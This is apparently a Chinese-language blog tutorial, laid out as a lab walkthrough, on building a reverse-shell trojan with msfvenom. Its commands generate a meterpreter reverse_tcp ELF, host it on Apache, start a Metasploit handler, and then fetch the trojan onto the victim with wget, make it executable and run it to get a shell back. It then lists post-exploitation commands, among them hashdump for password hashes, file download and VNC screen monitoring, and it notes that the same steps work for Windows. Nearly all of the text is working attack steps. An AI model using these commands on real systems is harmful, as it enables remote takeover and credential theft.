---
title: Msfvenom反弹木马
tags:
  - msfvenom
  - 反弹木马
categories:
  - Linux
  - Kali
  - 渗透
  - Msfvenom
keywords:
  - kali
  - msfvenom
  - 反弹木马
cover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg2020.cnblogs.com%2Fblog%2F1082680%2F202103%2F1082680-20210302183902075-2086539055.png&refer=http%3A%2F%2Fimg2020.cnblogs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1642507244&t=ac3e718ba15da03c7db9fbfc7c9bcbb6
abbrlink: 1
---






## Linux反弹木马

首先查找linux的pyloads

```
msfvenom -l payloads | grep linux
```

找到 linux/x64/meterpreter/reverse_tcp 这个将是我们要使用的

输入命令：

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=监听端口 -f elf -o test.elf
```

![](https://www.helloimg.com/images/2021/12/19/GwJPWn.png)

![](https://www.helloimg.com/images/2021/12/19/GwJFq6.png)

输入命令打开apache2

```
service apache2 start
或
systemctl start apache2
```

![](https://www.helloimg.com/images/2021/12/19/GwmLJM.png)

将木马文件移动到 /var/www/html 里面

```
mv test.elf /var/www/html/test.elf
```

![](https://www.helloimg.com/images/2021/12/19/Gwml6z.png)



打开msfconsole使用模块 exploit/multi/handler

```
use exploit/multi/handler
```

![](https://www.helloimg.com/images/2021/12/19/GwJAgT.png)



添加一个监听负载

```
set payload linux/x64/meterpreter/reverse_tcp
```

![](https://www.helloimg.com/images/2021/12/19/GwJ2jC.png)





配置攻击机IP还有刚才生成木马所使用的监听端口

```
set lhost 172.16.1.12
set lport 222
```

![](https://www.helloimg.com/images/2021/12/19/GwJfjh.png)



run运行

```
run
```

![](https://www.helloimg.com/images/2021/12/19/GwmFND.png)



打开putty，连接Linux

下面图片是连接成功画面

![](https://www.helloimg.com/images/2021/12/19/Gwmdcc.png)



输入命令下载刚才生成的木马

```
wget http://172.16.1.12/test.elf
```

![](https://www.helloimg.com/images/2021/12/19/Gwm7Sb.png)



给下载的木马添加权限

```
chmod +x test.elf
```

![](https://www.helloimg.com/images/2021/12/19/GwmkXt.png)



运行木马，返回kali成功拿取shell

```
./test.elf
```

![](https://www.helloimg.com/images/2021/12/19/GwsCYP.png)

![](https://www.helloimg.com/images/2021/12/19/GwsRX6.png)





```
一些命令：
	getuid			获取当前用户
	sysinfo			系统信息
	ps				查看所有进程
	dir				查看所有文件
	getwd			当前目录
	cat				查看文件内容（数据是字符串传递吗，前面要加一个\转义）
	download		下载文件
	run vnc			屏幕监控
	hashdump		获取密文密码
	shell			获取shell，进入cmd
	uname -a		Linux查看内核版本
	VER				Windows查看内核版本
	
```





## Windows反弹木马

和Linux一样，将Linux改为windos，将elf改为exe